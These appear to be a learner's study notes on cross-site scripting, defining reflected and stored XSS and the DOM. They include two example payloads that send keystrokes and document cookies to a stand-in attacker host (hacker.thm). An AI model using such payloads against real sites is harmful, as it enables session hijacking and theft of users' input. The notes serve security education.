XSS: Code injected by an attacker to be executed by a vulnerable webpage accessed by the victim. 
Ex.  <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
 or <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
 Reflected XSS: Victim accesses a link created by an attacker. The link contains injected code in the URL parameters, causing malicious code to run through the vulnerable website on the victim's computer.

Stored XSS: Attacker injects malicious code into vulnerable website input field, this gets stored on the database and displayed on the page(eg. comment on a forum). Any user accessing the page will run the attacker's code

DOM = Document Object Model: root: <html> -> element: <head> -> element: <title> -> text: "My Title"